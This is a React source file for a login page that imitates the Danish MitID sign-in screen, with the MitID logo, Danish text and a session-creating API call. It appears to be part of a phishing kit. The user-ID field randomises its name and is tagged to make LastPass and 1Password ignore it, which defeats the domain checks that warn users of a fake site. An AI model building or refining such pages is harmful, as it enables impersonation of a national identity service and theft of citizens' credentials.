import { useState } from 'react'
import BrandLogo from '../components/BrandLogo'
import MitIdLogo from '../components/MitIdLogo'
import CardShell from '../components/CardShell'
import HelpIcon from '../components/HelpIcon'
import InfoIcon from '../components/InfoIcon'
import ArrowIcon from '../components/ArrowIcon'
import SidePanel from '../components/SidePanel'
import { api } from '../services/api'

interface Props {
  onSessionCreated: (sessionId: string, userId: string) => void
}

export default function LoginPage({ onSessionCreated }: Props) {
  const [userId, setUserId] = useState('')
  const [showUserId, setShowUserId] = useState(true)
  const [remember, setRemember] = useState(false)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!userId.trim()) return
    setLoading(true)
    setError('')
    try {
      const { sessionId } = await api.initSession(userId)
      onSessionCreated(sessionId, userId)
    } catch {
      setError('Forbindelsen mislykkedes. Prøv igen.')
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-[#f0f1f3] flex flex-col">
      <header className="hidden sm:flex bg-white h-[50px] items-center px-6 border-b border-gray-200">
        <BrandLogo />
      </header>
      <main className="flex-1 flex items-start justify-center sm:pt-[60px] pt-0 px-0 sm:px-6">
        <div className="flex flex-col lg:flex-row gap-[60px] max-w-[900px] w-full items-center lg:items-start">
          <CardShell>
            <form className="flex flex-col h-full" onSubmit={handleSubmit}>
              <div className="flex items-start justify-between mb-2">
                <h1 className="text-[18px] font-bold text-[#001C44] leading-[1.35] pr-4">Log på hos MitID.dk</h1>
                <MitIdLogo />
              </div>
              <hr className="border-gray-200 my-4" />
              <div className="mb-5">
                <label className="flex items-center gap-1.5 text-[14px] font-bold text-[#001C44] tracking-wide mb-2.5 uppercase">
                  Bruger-ID
                  <button type="button" className="w-4 h-4 rounded-full flex items-center justify-center cursor-help" aria-label="Help"><HelpIcon /></button>
                </label>
                <div className="relative">
                  <input type={showUserId ? 'text' : 'password'} value={userId} onChange={(e) => setUserId(e.target.value)}
                    name={`uid_${Math.random().toString(36).slice(2)}`}
                    className="w-full border-2 border-gray-300 rounded px-4 py-3.5 text-[16px] text-[#001C44] focus:outline-none focus:border-[#0055a5] focus:ring-0 pr-14" autoComplete="one-time-code" inputMode="text" data-lpignore="true" data-1p-ignore="true" spellCheck={false} />
                  <div role="button" onClick={() => setShowUserId(!showUserId)} className="absolute right-4 top-1/2 -translate-y-1/2 text-[14px] text-gray-500 hover:text-gray-800 cursor-pointer select-none" tabIndex={0}>
                    {showUserId ? 'Skjul' : 'Vis'}
                  </div>
                </div>
              </div>
              {error && <div className="text-red-600 text-[12px] mb-2">{error}</div>}
              <button type="submit" disabled={loading || !userId.trim()}
                className={`w-full font-bold text-[16px] py-4 px-4 rounded flex items-center justify-between cursor-pointer transition-colors ${
                  userId.trim() && !loading ? 'bg-[#0055a5] hover:bg-[#004080] text-white' : 'bg-gray-200 text-gray-400 cursor-not-allowed'
                }`}>
                <span className="uppercase tracking-wide">{loading ? 'Forbinder...' : 'Fortsæt'}</span><ArrowIcon />
              </button>
              <div className="mt-4 mb-3">
                <a href="#" className="inline-flex items-center gap-2 text-[#0055a5] hover:underline text-[15px] font-bold"><InfoIcon /><span>Glemt bruger-ID?</span></a>
              </div>
              <div className="flex-1" />
              <label className="flex items-start gap-3 cursor-pointer mb-4">
                <input type="checkbox" checked={remember} onChange={(e) => setRemember(e.target.checked)} className="mt-0.5 w-[18px] h-[18px] accent-[#0055a5] rounded cursor-pointer shrink-0" />
                <span className="text-[15px] text-[#001C44] leading-snug">Husk mig hos MitID.dk</span>
              </label>
              <hr className="border-gray-200 mb-4" />
              <nav className="flex items-center gap-8 text-[15px] text-[#0055a5] font-medium">
                <a href="#" className="hover:underline">Afbryd</a><a href="#" className="hover:underline">Hjælp</a>
              </nav>
            </form>
          </CardShell>
          <div className="hidden lg:block"><SidePanel /></div>
        </div>
      </main>
    </div>
  )
}
